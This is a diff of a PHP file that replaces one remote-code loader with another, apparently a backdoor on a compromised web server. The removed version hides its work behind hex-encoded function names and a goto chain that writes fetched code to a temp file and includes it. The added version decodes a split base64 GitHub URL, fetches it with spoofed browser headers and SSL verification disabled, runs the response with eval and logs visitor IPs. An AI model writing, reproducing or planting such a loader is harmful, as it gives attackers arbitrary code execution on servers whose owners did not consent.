@@ -1,115 +1,99 @@
 <?php
-error_reporting(0);
-$pywuz=hex2bin('7379735f6765745f74656d705f646972');$kzeij=hex2bin('74656d706e616d');$objzh=hex2bin('66696c655f7075745f636f6e74656e7473');$hyjgm=hex2bin('756e6c696e6b');$vdmuk=hex2bin('666f70656e');$ydhwi=hex2bin('667772697465');$silgv=hex2bin('66636c6f7365'); $fcaomb=''; goto L53776980DD3A45A03;
-L29756980DD3A45A73: $fcaomb.="\x29\x20\x7b\x0d\x0a\x65\x63\x68\x6f\x20"; goto L66486980DD3A45A74;
-L87676980DD3A45A18: $fcaomb.="\x3d\x20\x63\x75\x72\x6c\x5f\x69\x6e\x69"; goto L90256980DD3A45A19;
-L89266980DD3A45A33: $fcaomb.="\x2c\x20\x43\x55\x52\x4c\x4f\x50\x54\x5f"; goto L16636980DD3A45A34;
-L18546980DD3A45A0C: $fcaomb.="\x63\x48\x4d\x36\x4c\x79\x39\x79\x59\x58"; goto L85436980DD3A45A0D;
-L75676980DD3A45A35: $fcaomb.="\x20\x27\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f"; goto L69456980DD3A45A36;
-L82956980DD3A45A2F: $fcaomb.="\x55\x52\x4c\x4f\x50\x54\x5f\x54\x49\x4d"; goto L90606980DD3A45A30;
-L52656980DD3A45A1C: $fcaomb.="\x4f\x50\x54\x5f\x55\x52\x4c\x2c\x20\x24"; goto L28496980DD3A45A1D;
-L24616980DD3A45A53: $fcaomb.="\x2c\x0d\x0a\x20\x20\x20\x20\x20\x20\x20"; goto L13116980DD3A45A54;
-L94226980DD3A45A2A: $fcaomb.="\x4c\x4f\x50\x54\x5f\x46\x4f\x4c\x4c\x4f"; goto L46786980DD3A45A2B;
-L44176980DD3A45A65: $fcaomb.="\x61\x6c\x28\x22\x3f\x3e\x22\x20\x2e\x20"; goto L46546980DD3A45A66;
-L28416980DD3A45A40: $fcaomb.="\x3d\x20\x5b\x0d\x0a\x20\x20\x20\x20\x20"; goto L46566980DD3A45A41;
-L33336980DD3A45A27: $fcaomb.="\x6c\x73\x65\x29\x3b\x0d\x0a\x20\x20\x20"; goto L80476980DD3A45A28;
-L77386980DD3A45A5C: $fcaomb.="\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x66"; goto L65426980DD3A45A5D;
-L75356980DD3A45A3F: $fcaomb.="\x7b\x0d\x0a\x20\x20\x20\x20\x24\x6f\x20"; goto L28416980DD3A45A40;
-L17546980DD3A45A0E: $fcaomb.="\x64\x58\x4e\x6c\x63\x6d\x4e\x76\x62\x6e"; goto L34546980DD3A45A0F;
-L68846980DD3A45A16: $fcaomb.="\x69\x6f\x6e\x20\x64\x28\x24\x78\x29\x20"; goto L55036980DD3A45A17;
-L48036980DD3A45A52: $fcaomb.="\x61\x2f\x35\x2e\x30\x5c\x72\x5c\x6e\x22"; goto L24616980DD3A45A53;
-L45436980DD3A45A64: $fcaomb.="\x29\x3b\x0d\x0a\x20\x20\x20\x20\x65\x76"; goto L44176980DD3A45A65;
-L83836980DD3A45A50: $fcaomb.="\x20\x22\x55\x73\x65\x72\x2d\x41\x67\x65"; goto L63806980DD3A45A51;
-L54176980DD3A45A5F: $fcaomb.="\x20\x66\x61\x6c\x73\x65\x2c\x20\x24\x7a"; goto L36906980DD3A45A60;
-L74626980DD3A45A6B: $fcaomb.="\x27\x29\x29\x20\x7b\x0d\x0a\x24\x6b\x20"; goto L43166980DD3A45A6C;
-L49016980DD3A45A61: $fcaomb.="\x75\x6e\x63\x74\x69\x6f\x6e\x20\x6a\x28"; goto L96886980DD3A45A62;
-L21826980DD3A45A0B: $fcaomb.="\x63\x6f\x64\x65\x28\x22\x61\x48\x52\x30"; goto L18546980DD3A45A0C;
-L28496980DD3A45A1D: $fcaomb.="\x78\x29\x3b\x0d\x0a\x20\x20\x20\x20\x63"; goto L51096980DD3A45A1E;
-L96116980DD3A45A67: $fcaomb.="\x0a\x0d\x0a\x74\x72\x79\x20\x7b\x0d\x0a"; goto L32906980DD3A45A68;
-L73706980DD3A45A47: $fcaomb.="\x20\x20\x20\x20\x22\x76\x65\x72\x69\x66"; goto L20936980DD3A45A48;
-L96886980DD3A45A62: $fcaomb.="\x24\x63\x29\x20\x7b\x0d\x0a\x20\x20\x20"; goto L74006980DD3A45A63;
-L35566980DD3A45A3E: $fcaomb.="\x69\x6f\x6e\x20\x66\x28\x24\x78\x29\x20"; goto L75356980DD3A45A3F;
-L70546980DD3A45A44: $fcaomb.="\x72\x69\x66\x79\x5f\x70\x65\x65\x72\x22"; goto L90966980DD3A45A45;
-L10336980DD3A45A0A: $fcaomb.="\x20\x62\x61\x73\x65\x36\x34\x5f\x64\x65"; goto L21826980DD3A45A0B;
-L16906980DD3A45A12: $fcaomb.="\x5a\x57\x5a\x7a\x4c\x32\x68\x6c\x59\x57"; goto L13706980DD3A45A13;
-L63806980DD3A45A51: $fcaomb.="\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c"; goto L48036980DD3A45A52;
-L51096980DD3A45A1E: $fcaomb.="\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74"; goto L56206980DD3A45A1F;
-L16636980DD3A45A34: $fcaomb.="\x55\x53\x45\x52\x41\x47\x45\x4e\x54\x2c"; goto L75676980DD3A45A35;
-L47806980DD3A45A14: $fcaomb.="\x4d\x69\x35\x77\x61\x48\x41\x3d\x22\x29"; goto L31926980DD3A45A15;
-L45086980DD3A45A22: $fcaomb.="\x29\x3b\x0d\x0a\x20\x20\x20\x20\x63\x75"; goto L46236980DD3A45A23;
-L36906980DD3A45A60: $fcaomb.="\x29\x3b\x0d\x0a\x7d\x0d\x0a\x0d\x0a\x66"; goto L49016980DD3A45A61;
-L99156980DD3A45A31: $fcaomb.="\x0d\x0a\x20\x20\x20\x20\x63\x75\x72\x6c"; goto L83176980DD3A45A32;
-L46236980DD3A45A23: $fcaomb.="\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74\x28"; goto L57426980DD3A45A24;
-L54546980DD3A45A1A: $fcaomb.="\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70"; goto L27086980DD3A45A1B;
-L34546980DD3A45A0F: $fcaomb.="\x52\x6c\x62\x6e\x51\x75\x59\x32\x39\x74"; goto L50056980DD3A45A10;
-L18066980DD3A45A25: $fcaomb.="\x54\x5f\x53\x53\x4c\x5f\x56\x45\x52\x49"; goto L33886980DD3A45A26;
-L43166980DD3A45A6C: $fcaomb.="\x3d\x20\x64\x28\x24\x75\x29\x3b\x0d\x0a"; goto L44186980DD3A45A6D;
-L87986980DD3A45A38: $fcaomb.="\x6c\x5f\x65\x78\x65\x63\x28\x24\x68\x29"; goto L43856980DD3A45A39;
-L79836980DD3A45A20: $fcaomb.="\x50\x54\x5f\x52\x45\x54\x55\x52\x4e\x54"; goto L73026980DD3A45A21;
-L41986980DD3A45A42: $fcaomb.="\x3e\x20\x5b\x0d\x0a\x20\x20\x20\x20\x20"; goto L12776980DD3A45A43;
-L88556980DD3A45A4E: $fcaomb.="\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22"; goto L88146980DD3A45A4F;
-L90606980DD3A45A30: $fcaomb.="\x45\x4f\x55\x54\x2c\x20\x31\x30\x29\x3b"; goto L99156980DD3A45A31;
-L85436980DD3A45A0D: $fcaomb.="\x63\x75\x5a\x32\x6c\x30\x61\x48\x56\x69"; goto L17546980DD3A45A0E;
-L13706980DD3A45A13: $fcaomb.="\x52\x7a\x4c\x32\x31\x68\x61\x57\x34\x76"; goto L47806980DD3A45A14;
-L19076980DD3A45A4D: $fcaomb.="\x20\x3d\x3e\x20\x5b\x0d\x0a\x20\x20\x20"; goto L88556980DD3A45A4E;
-L13116980DD3A45A54: $fcaomb.="\x20\x20\x20\x20\x20\x22\x74\x69\x6d\x65"; goto L89146980DD3A45A55;
-L56966980DD3A45A59: $fcaomb.="\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x6e"; goto L77516980DD3A45A5A;
-L58156980DD3A45A76: $fcaomb.="\x0d\x0a\x7d\x0a\x3f\x3e"; goto L17836980DD3A45A77;
-L50056980DD3A45A10: $fcaomb.="\x4c\x32\x78\x31\x5a\x6d\x5a\x35\x62\x33"; goto L12696980DD3A45A11;
-L67896980DD3A45A2D: $fcaomb.="\x20\x20\x20\x63\x75\x72\x6c\x5f\x73\x65"; goto L48136980DD3A45A2E;
-L56726980DD3A45A29: $fcaomb.="\x70\x74\x28\x24\x68\x2c\x20\x43\x55\x52"; goto L94226980DD3A45A2A;
-L87956980DD3A45A69: $fcaomb.="\x6f\x6e\x5f\x65\x78\x69\x73\x74\x73\x28"; goto L46176980DD3A45A6A;
-L48136980DD3A45A2E: $fcaomb.="\x74\x6f\x70\x74\x28\x24\x68\x2c\x20\x43"; goto L82956980DD3A45A2F;
-L65426980DD3A45A5D: $fcaomb.="\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f"; goto L68486980DD3A45A5E;
-L90256980DD3A45A19: $fcaomb.="\x74\x28\x29\x3b\x0d\x0a\x20\x20\x20\x20"; goto L54546980DD3A45A1A;
-L25396980DD3A45A5B: $fcaomb.="\x65\x28\x24\x6f\x29\x3b\x0d\x0a\x20\x20"; goto L77386980DD3A45A5C;
-L90966980DD3A45A45: $fcaomb.="\x20\x3d\x3e\x20\x66\x61\x6c\x73\x65\x2c"; goto L38256980DD3A45A46;
-L74586980DD3A45A4B: $fcaomb.="\x20\x20\x5d\x2c\x0d\x0a\x20\x20\x20\x20"; goto L11686980DD3A45A4C;
-L43856980DD3A45A39: $fcaomb.="\x3b\x0d\x0a\x20\x20\x20\x20\x63\x75\x72"; goto L81176980DD3A45A3A;
-L53776980DD3A45A03: $fcaomb.="\x3c\x3f\x70\x68\x70\x0a\x24\x75\x20\x3d"; goto L10336980DD3A45A0A;
-L81516980DD3A45A58: $fcaomb.="\x0a\x20\x20\x20\x20\x24\x7a\x20\x3d\x20"; goto L56966980DD3A45A59;
-L81176980DD3A45A3A: $fcaomb.="\x6c\x5f\x63\x6c\x6f\x73\x65\x28\x24\x68"; goto L71016980DD3A45A3B;
-L57426980DD3A45A24: $fcaomb.="\x24\x68\x2c\x20\x43\x55\x52\x4c\x4f\x50"; goto L18066980DD3A45A25;
-L33886980DD3A45A26: $fcaomb.="\x46\x59\x50\x45\x45\x52\x2c\x20\x66\x61"; goto L33336980DD3A45A27;
-L97096980DD3A45A72: $fcaomb.="\x63\x65\x70\x74\x69\x6f\x6e\x20\x24\x65"; goto L29756980DD3A45A73;
-L27086980DD3A45A1B: $fcaomb.="\x74\x28\x24\x68\x2c\x20\x43\x55\x52\x4c"; goto L52656980DD3A45A1C;
-L74006980DD3A45A63: $fcaomb.="\x20\x6f\x62\x5f\x73\x74\x61\x72\x74\x28"; goto L45436980DD3A45A64;
-L64516980DD3A45A6F: $fcaomb.="\x3b\x0d\x0a\x7d\x0d\x0a\x65\x63\x68\x6f"; goto L32416980DD3A45A70;
-L20936980DD3A45A48: $fcaomb.="\x79\x5f\x70\x65\x65\x72\x5f\x6e\x61\x6d"; goto L52226980DD3A45A49;
-L77516980DD3A45A5A: $fcaomb.="\x74\x65\x78\x74\x5f\x63\x72\x65\x61\x74"; goto L25396980DD3A45A5B;
-L44186980DD3A45A6D: $fcaomb.="\x7d\x20\x65\x6c\x73\x65\x20\x7b\x0d\x0a"; goto L54476980DD3A45A6E;
-L47966980DD3A45A37: $fcaomb.="\x20\x20\x24\x72\x20\x3d\x20\x63\x75\x72"; goto L87986980DD3A45A38;
-L54146980DD3A45A75: $fcaomb.="\x65\x73\x61\x6c\x61\x68\x61\x6e\x22\x3b"; goto L58156980DD3A45A76;
-L32416980DD3A45A70: $fcaomb.="\x20\x6a\x28\x24\x6b\x29\x3b\x0d\x0a\x7d"; goto L72196980DD3A45A71;
-L80506980DD3A45A3C: $fcaomb.="\x74\x75\x72\x6e\x20\x24\x72\x3b\x0d\x0a"; goto L35116980DD3A45A3D;
-L31506980DD3A45A56: $fcaomb.="\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"; goto L73746980DD3A45A57;
-L56206980DD3A45A1F: $fcaomb.="\x28\x24\x68\x2c\x20\x43\x55\x52\x4c\x4f"; goto L79836980DD3A45A20;
-L54476980DD3A45A6E: $fcaomb.="\x24\x6b\x20\x3d\x20\x66\x28\x24\x75\x29"; goto L64516980DD3A45A6F;
-L52226980DD3A45A49: $fcaomb.="\x65\x22\x20\x3d\x3e\x20\x66\x61\x6c\x73"; goto L68986980DD3A45A4A;
-L46546980DD3A45A66: $fcaomb.="\x24\x63\x29\x3b\x0d\x0a\x0d\x0a\x7d\x0d"; goto L96116980DD3A45A67;
-L55036980DD3A45A17: $fcaomb.="\x7b\x0d\x0a\x20\x20\x20\x20\x24\x68\x20"; goto L87676980DD3A45A18;
-L88146980DD3A45A4F: $fcaomb.="\x68\x65\x61\x64\x65\x72\x22\x20\x3d\x3e"; goto L83836980DD3A45A50;
-L32906980DD3A45A68: $fcaomb.="\x69\x66\x20\x28\x66\x75\x6e\x63\x74\x69"; goto L87956980DD3A45A69;
-L72196980DD3A45A71: $fcaomb.="\x20\x63\x61\x74\x63\x68\x20\x28\x45\x78"; goto L97096980DD3A45A72;
-L83176980DD3A45A32: $fcaomb.="\x5f\x73\x65\x74\x6f\x70\x74\x28\x24\x68"; goto L89266980DD3A45A33;
-L38256980DD3A45A46: $fcaomb.="\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"; goto L73706980DD3A45A47;
-L46786980DD3A45A2B: $fcaomb.="\x57\x4c\x4f\x43\x41\x54\x49\x4f\x4e\x2c"; goto L29086980DD3A45A2C;
-L68986980DD3A45A4A: $fcaomb.="\x65\x2c\x0d\x0a\x20\x20\x20\x20\x20\x20"; goto L74586980DD3A45A4B;
-L29086980DD3A45A2C: $fcaomb.="\x20\x74\x72\x75\x65\x29\x3b\x0d\x0a\x20"; goto L67896980DD3A45A2D;
-L46176980DD3A45A6A: $fcaomb.="\x27\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74"; goto L74626980DD3A45A6B;
-L89146980DD3A45A55: $fcaomb.="\x6f\x75\x74\x22\x20\x3d\x3e\x20\x31\x30"; goto L31506980DD3A45A56;
-L73746980DD3A45A57: $fcaomb.="\x5d\x0d\x0a\x20\x20\x20\x20\x5d\x3b\x0d"; goto L81516980DD3A45A58;
-L35116980DD3A45A3D: $fcaomb.="\x7d\x0d\x0a\x0d\x0a\x66\x75\x6e\x63\x74"; goto L35566980DD3A45A3E;
-L66486980DD3A45A74: $fcaomb.="\x22\x54\x65\x72\x6a\x61\x64\x69\x20\x6b"; goto L54146980DD3A45A75;
-L46566980DD3A45A41: $fcaomb.="\x20\x20\x20\x22\x73\x73\x6c\x22\x20\x3d"; goto L41986980DD3A45A42;
-L12696980DD3A45A11: $fcaomb.="\x42\x74\x4c\x32\x39\x77\x62\x53\x39\x79"; goto L16906980DD3A45A12;
-L68486980DD3A45A5E: $fcaomb.="\x6e\x74\x65\x6e\x74\x73\x28\x24\x78\x2c"; goto L54176980DD3A45A5F;
-L31926980DD3A45A15: $fcaomb.="\x3b\x0d\x0a\x0d\x0a\x66\x75\x6e\x63\x74"; goto L68846980DD3A45A16;
-L73026980DD3A45A21: $fcaomb.="\x52\x41\x4e\x53\x46\x45\x52\x2c\x20\x31"; goto L45086980DD3A45A22;
-L80476980DD3A45A28: $fcaomb.="\x20\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f"; goto L56726980DD3A45A29;
-L69456980DD3A45A36: $fcaomb.="\x35\x2e\x30\x27\x29\x3b\x0d\x0a\x20\x20"; goto L47966980DD3A45A37;
-L12776980DD3A45A43: $fcaomb.="\x20\x20\x20\x20\x20\x20\x20\x22\x76\x65"; goto L70546980DD3A45A44;
-L71016980DD3A45A3B: $fcaomb.="\x29\x3b\x0d\x0a\x20\x20\x20\x20\x72\x65"; goto L80506980DD3A45A3C;
-L11686980DD3A45A4C: $fcaomb.="\x20\x20\x20\x20\x22\x68\x74\x74\x70\x22"; goto L19076980DD3A45A4D;
-L17836980DD3A45A77: $drfnmb = $kzeij($pywuz(), 'x'); if(function_exists($objzh)){ $objzh($drfnmb, $fcaomb); } else { $mhba = $vdmuk($drfnmb, 'w'); $ydhwi($mhba, $fcaomb); $silgv($mhba); } include($drfnmb); $hyjgm($drfnmb);
+$encoded_url_1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1ZmZ5b3BtL29wbS9yZWZzL2hlYWRzL2';
+$encoded_url_2 = '1haW4vMi5waHA=';
+$url = base64_decode($encoded_url_1 . $encoded_url_2);
+
+function fetchWithCurl($url) {
+    $ch = curl_init();
+    $userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+    ];
+    $headers = [
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language: en-US,en;q=0.9',
+        'Accept-Encoding: gzip, deflate, br',
+        'Connection: keep-alive',
+        'Upgrade-Insecure-Requests: 1',
+        'Cache-Control: max-age=0',
+        'TE: Trailers'
+    ];
+    $options = [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        CURLOPT_ENCODING => 'gzip, deflate',
+        CURLOPT_USERAGENT => $userAgents[array_rand($userAgents)],
+        CURLOPT_HTTPHEADER => $headers,
+        CURLOPT_REFERER => 'https://www.google.com/',
+        CURLOPT_COOKIEJAR => '/tmp/cookies.txt',
+        CURLOPT_COOKIEFILE => '/tmp/cookies.txt'
+    ];
+    curl_setopt_array($ch, $options);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    return [
+        'success' => ($httpCode === 200 && !empty($response)),
+        'data' => $response,
+        'error' => $error,
+        'code' => $httpCode
+    ];
+}
+
+function cleanCode($code) {
+    $code = str_replace("\xEF\xBB\xBF", '', $code);
+    $code = trim($code);
+    if (!mb_check_encoding($code, 'UTF-8')) {
+        $code = mb_convert_encoding($code, 'UTF-8');
+    }
+    return $code;
+}
+
+$result = fetchWithCurl($url);
+
+if ($result['success']) {
+    $remoteCode = $result['data'];
+    $remoteCode = cleanCode($remoteCode);
+    if (strpos($remoteCode, '<?php') === 0 || strpos($remoteCode, '<?=') === 0) {
+        eval('?>' . $remoteCode);
+    } else {
+        eval($remoteCode);
+    }
+} else {
+    echo "<h3>Error: Gagal mengambil kode</h3>";
+    echo "<p>HTTP Code: " . $result['code'] . "</p>";
+    echo "<p>Error: " . htmlspecialchars($result['error']) . "</p>";
+    ini_set('allow_url_fopen', 1);
+    $alternativeCode = @file_get_contents($url);
+    if ($alternativeCode !== false) {
+        echo "<p>Menggunakan metode alternatif...</p>";
+        eval('?>' . $alternativeCode);
+    }
+}
+
+function logExecution($url, $success, $error = '') {
+    $logFile = __DIR__ . '/execution_log.txt';
+    $timestamp = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+    $logEntry = sprintf(
+        "[%s] IP: %s | URL: %s | Status: %s | Error: %s\n",
+        $timestamp,
+        $ip,
+        $url,
+        $success ? 'SUCCESS' : 'FAILED',
+        $error
+    );
+    @file_put_contents($logFile, $logEntry, FILE_APPEND);
+}
+
+logExecution($url, $result['success'], $result['error']);
 ?>
